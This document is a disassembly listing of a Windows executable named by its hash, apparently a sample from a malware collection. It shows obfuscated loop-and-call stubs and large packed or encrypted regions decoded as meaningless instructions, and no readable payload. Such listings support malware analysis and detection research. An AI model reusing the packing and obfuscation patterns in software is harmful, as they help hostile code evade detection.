
722c063d6f7646ca1000c6e89fd2ef725c69f69e9e31a3cad9b6906712abb90f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433697,0x1c
  401013:	cmp    DWORD PTR ds:0x433697,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433697,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433697,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433697
  401055:	dec    eax
  401056:	mov    ds:0x433697,eax
  40105b:	mov    eax,ds:0x433697
  401060:	dec    eax
  401061:	mov    ds:0x433697,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43369b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43369f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4336d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4336af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433693
  4010b6:	mov    DWORD PTR ds:0x4336af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43372b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4336af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4336af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4336af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4336af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4336af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4336af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4336af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4336af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433677
  40113c:	mov    eax,ds:0x433733
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43371b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4335ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43361f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43365b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     ch,ah
  4011b8:	(bad)  [edx+0x7e7e7e6e]
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    eax,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    edi,esi
  4011d1:	add    BYTE PTR [edi],cl
  4011d3:	xor    ecx,DWORD PTR [edi]
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0xd9a6b827
  40126d:	dec    ebx
  40126e:	adc    BYTE PTR [ebx+0x417771bb],0x55
  401275:	cmp    ebp,DWORD PTR [edi-0x2b]
  401278:	retf   0x6554
  40127b:	in     eax,dx
  40127c:	jmp    0xcc20:0x8efb7a42
  401283:	cmp    DWORD PTR [edx-0x72d44886],eax
  401289:	popa   
  40128a:	test   DWORD PTR [ebx-0x40487616],ebx
  401290:	jns    0x4012f1
  401292:	dec    ecx
  401293:	sbb    ebp,DWORD PTR [edx]
  401295:	dec    esi
  401296:	out    dx,eax
  401297:	outs   dx,DWORD PTR ds:[esi]
  401298:	outs   dx,DWORD PTR ds:[esi]
  401299:	pop    eax
  40129a:	xchg   edx,eax
  40129b:	bound  edi,QWORD PTR es:[ebp+0x78]
  40129f:	add    eax,0x985e81ae
  4012a4:	and    ebx,0x4a
  4012a7:	sub    edx,esi
  4012a9:	push   cs
  4012aa:	cmp    eax,0x71f6ea1b
  4012af:	jp     0x40131b
  4012b1:	out    0xb9,eax
  4012b3:	add    al,0xa4
  4012b5:	adc    DWORD PTR [ebp+0x61],esi
  4012b8:	scas   al,BYTE PTR es:[edi]
  4012b9:	xor    eax,0x3f32ccec
  4012be:	cdq    
  4012bf:	mov    ecx,0xef21a7da
  4012c4:	add    DWORD PTR [ebp+0x44],ecx
  4012c7:	or     dh,BYTE PTR [ebx-0x48]
  4012ca:	and    ch,dh
  4012cc:	cli    
  4012cd:	sar    eax,1
  4012cf:	jns    0x4012ea
  4012d1:	mov    ecx,0xba5234ac
  4012d6:	xchg   esp,eax
  4012d7:	fdivr  st,st(3)
  4012d9:	enter  0x11ce,0xcc
  4012dd:	lahf   
  4012de:	ds push ss
  4012e0:	mov    bh,0x2a
  4012e2:	jp     0x4012ae
  4012e4:	sub    al,0x77
  4012e6:	xlat   BYTE PTR ds:[ebx]
  4012e7:	aad    0x8f
  4012e9:	fld    st(6)
  4012eb:	push   ss
  4012ec:	mov    BYTE PTR [edi-0x1e],bl
  4012ef:	mov    bl,0x1c
  4012f1:	add    ah,BYTE PTR [ebx]
  4012f3:	imul   esp,DWORD PTR [edx-0x45],0xffffffc4
  4012f7:	dec    ebx
  4012f8:	jmp    0xcdc2:0xc611cbd7
  4012ff:	xor    edi,DWORD PTR [esi+0xc]
  401302:	jb     0x40137a
  401304:	mov    bh,0x2d
  401306:	stc    
  401307:	(bad)  
  401308:	fwait
  401309:	clc    
  40130a:	cmp    al,0xe7
  40130c:	aaa    
  40130d:	fsub   DWORD PTR [ecx+esi*4]
  401310:	jle    0x40135e
  401312:	mov    BYTE PTR [ebx+0x3c],ah
  401315:	xchg   ebp,eax
  401316:	stos   DWORD PTR es:[edi],eax
  401317:	adc    DWORD PTR [esi],esp
  401319:	push   0x70
  40131b:	(bad)  
  40131c:	push   eax
  40131d:	mov    esi,0xc3d34526
  401322:	jmp    0x84b0:0x968cd505
  401329:	jge    0x401301
  40132b:	adc    al,0x26
  40132d:	repz fcomp DWORD PTR [edi-0x4f]
  401331:	(bad)  
  401332:	mul    dh
  401334:	test   eax,0x5d5aa2e4
  401339:	shl    BYTE PTR [ebx+0x38de7e5f],0x5f
  401340:	loope  0x401397
  401342:	push   ecx
  401343:	inc    edi
  401344:	jae    0xf4859c6b
  40134a:	and    DWORD PTR ds:0x433653,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433653
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433653,ebx
  401366:	cmp    DWORD PTR ds:0x433653,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433653,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43360b,0x4335ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	inc    ebp
  4013b4:	mov    dl,0x92
  4013b6:	ret    0x7ffa
  4013b9:	jle    0x401439
  4013bb:	cli    
  4013bc:	jg     0x40143c
  4013be:	jle    0x4013f6
  4013c0:	adc    DWORD PTR [edi],edx
  4013c2:	mov    ebp,0x2a285bb1
  4013c7:	add    al,0x6d
  4013c9:	and    al,0x31
  4013cb:	or     bl,dl
  4013cd:	pop    edx
  4013ce:	cmp    dh,BYTE PTR [ecx+ebx*4+0x73bb3c52]
  4013d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013d6:	fsub   QWORD PTR [edx]
  4013d8:	mov    BYTE PTR [ecx],bl
  4013da:	(bad)  
  4013db:	push   cs
  4013dc:	repnz outs dx,DWORD PTR ds:[esi]
  4013de:	es push 0xf4343fd8
  4013e4:	sub    ecx,DWORD PTR [edx-0x12a4eff]
  4013ea:	stos   DWORD PTR es:[edi],eax
  4013eb:	dec    eax
  4013ec:	rcl    DWORD PTR [ebx+0x3c],1
  4013ef:	fwait
  4013f0:	mov    DWORD PTR ds:0xdbe4c4ef,esp
  4013f6:	push   0x62
  4013f8:	pop    ds
  4013f9:	xchg   BYTE PTR [edi-0x35d5f71f],dh
  4013ff:	mov    ?,WORD PTR [eax]
  401401:	dec    ecx
  401402:	mov    ecx,0x966950f7
  401407:	mov    edi,0x28677004
  40140c:	in     al,0x59
  40140e:	sub    esi,ebx
  401410:	data16 or dl,BYTE PTR [edx]
  401413:	jae    0x40143f
  401415:	jno    0x40147d
  401417:	fidiv  DWORD PTR [eax+0x6a230f94]
  40141d:	or     dl,bl
  40141f:	mov    WORD PTR [edx],?
  401421:	je     0x40140f
  401423:	mov    al,0x17
  401425:	jb     0x4013aa
  401427:	inc    edx
  401428:	out    0xa8,al
  40142a:	add    al,0xef
  40142c:	cmp    BYTE PTR [eax+esi*1+0x345524d],0x98
  401434:	enter  0x4762,0xec
  401438:	sbb    ecx,edx
  40143a:	ficom  DWORD PTR [ebx+0x4f]
  40143d:	into   
  40143e:	es inc esi
  401440:	stc    
  401441:	sbb    DWORD PTR [ebx],edx
  401443:	pop    es
  401444:	sub    dh,0x32
  401447:	pop    eax
  401448:	adc    DWORD PTR [eax-0x41bb4e2f],edi
  40144e:	jno    0x401418
  401450:	xor    ecx,eax
  401452:	(bad)  
  401453:	push   ebp
  401454:	jo     0x4014cb
  401456:	loope  0x40148c
  401458:	sub    ah,BYTE PTR [ecx-0x46]
  40145b:	xchg   ebx,eax
  40145c:	cmp    ecx,DWORD PTR [eax]
  40145e:	(bad)  
  40145f:	mov    ds:0xf37d1d56,al
  401464:	push   ebx
  401465:	cmp    ch,bh
  401467:	js     0x401434
  401469:	imul   edx,ecx,0x65
  40146c:	jb     0x401443
  40146e:	push   cs
  40146f:	hlt    
  401470:	pushf  
  401471:	out    0x36,al
  401473:	cli    
  401474:	or     ah,BYTE PTR ds:0xd3cca
  40147a:	into   
  40147b:	imul   esi,DWORD PTR [ebx],0x78994c1d
  401481:	pusha  
  401482:	outs   dx,DWORD PTR ds:[esi]
  401483:	push   edx
  401484:	int3   
  401485:	inc    ebp
  401486:	mov    WORD PTR [edi+ecx*8+0xf],gs
  40148a:	cs pusha 
  40148c:	and    al,0x7d
  40148e:	mov    ds:0xb3cf1b26,eax
  401493:	cwde   
  401494:	jbe    0x4014e8
  401496:	mov    ebx,0x4107ed8e
  40149b:	mov    edx,0xacfe0af6
  4014a0:	sub    edi,esi
  4014a2:	push   cs
  4014a3:	arpl   WORD PTR [ebx-0x2874e6eb],ax
  4014a9:	cmp    al,BYTE PTR [ebp-0x6a]
  4014ac:	jb     0x40142e
  4014ae:	jb     0x4014db
  4014b0:	add    eax,0x9cdf450d
  4014b5:	jge    0x40149f
  4014b7:	add    ebx,ebx
  4014b9:	daa    
  4014ba:	pop    esp
  4014bb:	mov    al,0x20
  4014bd:	mov    bh,BYTE PTR [edx]
  4014bf:	adc    al,0xa7
  4014c1:	and    eax,0x1ea88db9
  4014c6:	(bad)  ds:[eax]
  4014c9:	or     al,0x63
  4014cb:	dec    DWORD PTR [eax+ecx*4-0xfd8a1f7]
  4014d2:	jl     0x4014fb
  4014d4:	nop
  4014d5:	or     al,0xd0
  4014d7:	scas   al,BYTE PTR es:[edi]
  4014d8:	mov    edi,0x6d6b88cf
  4014dd:	sub    ebx,ebx
  4014df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014e0:	and    esp,ebx
  4014e2:	or     dh,ah
  4014e4:	pop    es
  4014e5:	jp     0x40148d
  4014e7:	sbb    bl,dl
  4014e9:	rcr    BYTE PTR [edi],0xfe
  4014ec:	adc    esi,DWORD PTR [ecx+eax*8+0x51]
  4014f0:	retf   0x1b0b
  4014f3:	sbb    eax,DWORD PTR [esi+0x6f7250f4]
  4014f9:	push   eax
  4014fa:	(bad)  
  4014fb:	sub    BYTE PTR [edi-0x1f],ah
  4014fe:	cmp    eax,0xca6a6d26
  401503:	add    eax,0x7ba5e84f
  401508:	adc    BYTE PTR [esp+ecx*4-0x59],cl
  40150c:	and    cl,bl
  40150e:	ficom  DWORD PTR [ebp+edx*1-0x71]
  401512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401513:	pop    ss
  401514:	mov    eax,ds:0x88912104
  401519:	xchg   esi,eax
  40151a:	mov    eax,0x15f97d1c
  40151f:	dec    ebp
  401520:	clc    
  401521:	cwde   
  401522:	adc    eax,DWORD PTR [eax+0x5e4f319c]
  401528:	or     bh,BYTE PTR [edi-0x4115f7bd]
  40152e:	(bad)  
  40152f:	mov    edx,0x646f11be
  401534:	pop    eax
  401535:	push   edi
  401536:	xlat   BYTE PTR ds:[ebx]
  401537:	lods   al,BYTE PTR ds:[esi]
  401538:	adc    edi,DWORD PTR [ebp+0x45]
  40153b:	outs   dx,BYTE PTR ds:[esi]
  40153c:	int3   
  40153d:	xor    DWORD PTR [ecx+0x44],ebp
  401540:	dec    esp
  401541:	into   
  401542:	sub    DWORD PTR [ebx+0x1d31c445],ecx
  401548:	(bad)  
  40154a:	inc    ebx
  40154b:	add    BYTE PTR [ebx],dh
  40154d:	(bad)  
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x7653731d]
  401564:	inc    DWORD PTR [esi]
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x40156a
  40156e:	sub    eax,0x1c3a6990
  401573:	dec    ebx
  401574:	vpshlw ymm1,xmm5,[edx-0x21091c20]
  40157d:	(bad)  [edi+0x44eb2278]
  401583:	les    esi,FWORD PTR [ebp+edi*4-0x6282e192]
  40158a:	xchg   ebp,eax
  40158b:	xchg   esi,eax
  40158c:	xchg   ebx,eax
  40158d:	retf   
  40158e:	sub    eax,0xb0348016
  401593:	call   DWORD PTR [ebp+ebx*2-0x5241657c]
  40159a:	and    eax,0x73ed5d35
  40159f:	inc    ecx
  4015a0:	mov    bh,0xad
  4015a2:	ins    BYTE PTR es:[edi],dx
  4015a3:	daa    
  4015a4:	bound  edi,QWORD PTR [ecx]
  4015a6:	ret    
  4015a7:	ror    BYTE PTR [edi],cl
  4015a9:	aam    0x8d
  4015ab:	jl     0x4015a9
  4015ad:	and    ebx,ebp
  4015af:	fidivr DWORD PTR [esi+0x14c73cde]
  4015b5:	jge    0x401606
  4015b7:	xchg   DWORD PTR [eax+ebp*8+0x6b],esi
  4015bb:	push   ss
  4015bc:	pop    edi
  4015bd:	data16 jl 0x40156c
  4015c0:	and    eax,0xdf2abf21
  4015c5:	lock (bad) 
  4015c7:	loopne 0x401611
  4015c9:	mov    al,ds:0x5e138daa
  4015ce:	pop    eax
  4015cf:	les    esi,FWORD PTR [edi]
  4015d1:	pop    ss
  4015d2:	xor    bh,bl
  4015d4:	pusha  
  4015d5:	add    eax,0x8bdff9de
  4015da:	sti    
  4015db:	jl     0x40164e
  4015dd:	lds    ebp,FWORD PTR [edi-0x48]
  4015e0:	(bad)  
  4015e2:	pop    esi
  4015e3:	pop    esi
  4015e4:	mov    DWORD PTR [edi-0x176dc995],ecx
  4015ea:	dec    bx
  4015ec:	pop    esi
  4015ed:	inc    eax
  4015ee:	(bad)  
  4015ef:	mov    ds:0x9aa62b08,al
  4015f4:	push   cs
  4015f5:	mov    ecx,0x20efe2a6
  4015fa:	mov    bl,0x11
  4015fc:	add    DWORD PTR ds:0x341db573,ecx
  401602:	cmc    
  401603:	or     ebp,edi
  401605:	hlt    
  401606:	sar    DWORD PTR [edi],cl
  401608:	cmp    eax,0xb0dd7a60
  40160d:	(bad)  
  40160e:	lock mov ah,0xb3
  401611:	das    
  401612:	adc    ch,BYTE PTR [esi]
  401614:	(bad)  
  401615:	cmp    ch,BYTE PTR ds:0x38b4322
  40161b:	xchg   edi,eax
  40161c:	dec    ecx
  40161d:	out    0xfa,eax
  40161f:	sub    bh,al
  401621:	test   BYTE PTR [ecx],ch
  401623:	retf   0x492f
  401626:	aad    0x5f
  401628:	lea    edi,gs:[ebp+0x2d583e2a]
  40162f:	aam    0x54
  401631:	es bound ecx,QWORD PTR es:[edx+0x35c5135a]
  401639:	mov    bl,0xf0
  40163b:	mov    dh,0xfb
  40163d:	mov    BYTE PTR [ebx-0x6e],cl
  401640:	mov    fs:0x2b9dfa4a,eax
  401646:	(bad)  
  401647:	jnp    0x40163c
  401649:	add    ch,BYTE PTR [edi+0x3affbba0]
  40164f:	bnd jno 0x4015eb
  401652:	mov    ebp,eax
  401654:	loop   0x401626
  401656:	xchg   ebx,eax
  401657:	jnp    0x4015fd
  401659:	xor    al,0xd
  40165b:	inc    edi
  40165c:	dec    ebp
  40165d:	pop    ebx
  40165e:	pop    eax
  40165f:	cmp    al,0x9
  401661:	scas   eax,DWORD PTR es:[edi]
  401662:	iret   
  401663:	jb     0x401637
  401665:	cs dec eax
  401667:	push   ebp
  401668:	clc    
  401669:	xor    DWORD PTR [ecx],edx
  40166b:	adc    BYTE PTR [edi-0x3c],ch
  40166e:	stc    
  40166f:	mov    esp,0xe86bb086
  401674:	or     dh,dh
  401676:	test   DWORD PTR [esi+ebp*2],esi
  401679:	push   cs
  40167a:	test   BYTE PTR [ecx+0x7b],0xdc
  40167e:	fs push esi
  401680:	cld    
  401681:	sahf   
  401682:	les    esi,FWORD PTR [ebx+ebp*1]
  401685:	fdiv   DWORD PTR [ebx+esi*8-0x4b]
  401689:	inc    edx
  40168a:	sbb    eax,0xaa98aef1
  40168f:	xchg   BYTE PTR [ebp-0x5f340988],bl
  401695:	xchg   esp,eax
  401696:	inc    esi
  401697:	ins    DWORD PTR es:[edi],dx
  401698:	ins    DWORD PTR es:[edi],dx
  401699:	cmp    al,0xeb
  40169b:	inc    ebp
  40169c:	mov    al,ds:0x9c7404c6
  4016a1:	pop    edx
  4016a2:	imul   BYTE PTR [ebx+0x72]
  4016a5:	aaa    
  4016a6:	cmp    BYTE PTR [ebx+eiz*8+0x4f],bl
  4016aa:	cmp    al,0xe8
  4016ac:	mov    ebp,0xf8cf1fa6
  4016b1:	arpl   WORD PTR [esi+0x2d],si
  4016b4:	mov    edx,0xbe663f68
  4016b9:	pop    eax
  4016ba:	jmp    0xb293:0x15e0cbe6
  4016c1:	mov    esi,0xfb889f80
  4016c6:	jmp    0x58111fc6
  4016cb:	sub    BYTE PTR [ebx+eiz*2-0x3c5b017c],al
  4016d2:	scas   al,BYTE PTR es:[edi]
  4016d3:	(bad)  
  4016d4:	aaa    
  4016d5:	(bad)  
  4016d7:	inc    edx
  4016d8:	scas   al,BYTE PTR es:[edi]
  4016d9:	adc    eax,0x970ca7cb
  4016de:	mov    DWORD PTR [eax-0x59],ebp
  4016e1:	mov    ebp,0x2a11dfdb
  4016e6:	mov    bh,0x67
  4016e8:	inc    edx
  4016e9:	cmp    cl,BYTE PTR [ebx]
  4016eb:	jmp    0x368:0xef2dfb49
  4016f2:	(bad)  
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4336df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4336df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4336df,ebx
  401721:	cmp    DWORD PTR ds:0x4336df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4336df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4336df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4336df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4336df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433603,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433617
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43360b
  401793:	and    ecx,DWORD PTR ds:0x43365b
  401799:	mov    DWORD PTR ds:0x43360b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43372f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43372f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43372f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43372f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43372f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43372f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43372f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43372f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4336e3,0x0
  401819:	mov    eax,ds:0x4336e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4336e3,eax
  401824:	cmp    DWORD PTR ds:0x4336e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433623
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4336e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43371f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43372b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43372b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43372b,ecx
  401878:	cmp    DWORD PTR ds:0x43372b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43372b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43372b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43372b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43372b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x433b6ade
  4018e9:	dec    cx
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x401906
  4018f4:	jmp    DWORD PTR [eax-0x6237d4b3]
  4018fa:	dec    ecx
  4018fb:	hlt    
  4018fc:	pcmpeqw mm7,mm5
  4018ff:	out    0xb6,eax
  401901:	push   edx
  401902:	mov    DWORD PTR [esp+edi*2],edi
  401905:	outs   dx,DWORD PTR ds:[esi]
  401906:	or     eax,0xb11aab9d
  40190b:	jle    0x4018b5
  40190d:	adc    dh,BYTE PTR [ebp+0x9]
  401910:	push   esi
  401911:	dec    edx
  401912:	pop    es
  401913:	sub    al,0xe9
  401915:	bound  edi,QWORD PTR [eax+0x57]
  401918:	pusha  
  401919:	inc    esi
  40191a:	push   edi
  40191b:	pop    ebp
  40191c:	xchg   ebx,ecx
  40191e:	test   eax,0x8558cf4c
  401923:	scas   eax,DWORD PTR es:[edi]
  401924:	pop    ss
  401925:	and    bl,cl
  401927:	and    eax,0x612be0d4
  40192c:	jmp    0x2a02:0x3f976f8d
  401933:	add    eax,0x4e3908a7
  401938:	cwde   
  401939:	sbb    eax,0xfa556a13
  40193e:	cmp    eax,0x789d9fd9
  401944:	xchg   BYTE PTR [ebx],dl
  401946:	push   0x70
  401948:	mov    esi,0xdb781d1f
  40194d:	mov    ecx,0x997b0d69
  401952:	icebp  
  401953:	inc    edx
  401954:	add    DWORD PTR [ebp+0x2b],esi
  401957:	retf   0xcc8d
  40195a:	sub    ecx,esp
  40195c:	leave  
  40195d:	add    DWORD PTR fs:[esi],esi
  401960:	mov    al,ds:0x5705177c
  401965:	inc    eax
  401966:	mov    eax,0xc45d3753
  40196b:	adc    BYTE PTR [esi+0x30],bh
  40196e:	cs jo  0x4018fe
  401971:	or     eax,0xe59b396e
  401976:	and    DWORD PTR [ecx-0x673d4097],edx
  40197c:	sbb    esp,DWORD PTR [esi+edi*4-0x202b16d8]
  401983:	adc    ecx,edi
  401985:	ins    DWORD PTR es:[edi],dx
  401986:	push   ss
  401987:	add    eax,0x933f264f
  40198c:	adc    esi,ebp
  40198e:	iret   
  40198f:	bound  ecx,QWORD PTR [ebx]
  401991:	out    0x92,eax
  401993:	imul   BYTE PTR [edi+0x1d1bcf1d]
  401999:	shl    DWORD PTR [esi+0x7554be69],1
  40199f:	daa    
  4019a0:	sti    
  4019a1:	rcr    esp,1
